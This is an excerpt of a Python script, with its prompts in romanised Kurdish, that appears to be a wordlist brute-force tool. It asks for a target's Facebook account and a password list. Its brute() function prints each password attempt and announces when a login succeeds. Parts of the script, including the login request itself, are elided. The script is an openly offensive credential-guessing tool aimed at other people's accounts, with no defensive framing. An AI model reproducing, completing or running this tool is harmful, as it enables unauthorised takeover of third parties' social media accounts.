...
system("clear")
slowprint(banner)
email = str(raw_input("\033[37;1mfacebooky kasaka dabne \033[31;1m: \033[33;1m"))
passwordlist = str(raw_input("\033[37;1mwordlist dabne \033[31;1m: \033[33;1m"))
...
def main():
    try:
        ...
        menu()
        search()
        print("\033[32;1m[\033[31;1m!\033[32;1m]\033[33;1m passwordy naw Wordlist aka nabw")
    except mechanize.URLError:
        print("\n\033[32;1m[\033[31;1m!\033[32;1m]\033[33;1m Xatt Nama")
        sleep(2)
        print("\033[32;1m[\033[31;1m!\033[32;1m] \033[31;1mExit\x1b[0m")
        exit()

def brute(password):
    sys.stdout.write("\033[36;1m\r[\033[33;1m-\033[36;1m] \033[37;1mTaqikrdnaway Password\033[31;1m=> \033[33;1m{}\n".format(password))
    sys.stdout.flush()
    ...
    if log != login and (not 'login_attempt' in log):
        print("\033[36;1m[\033[33;1m+\033[36;1m] \033[37;1mPassword Dozrayawa => \033[32;1m{}".format(password))
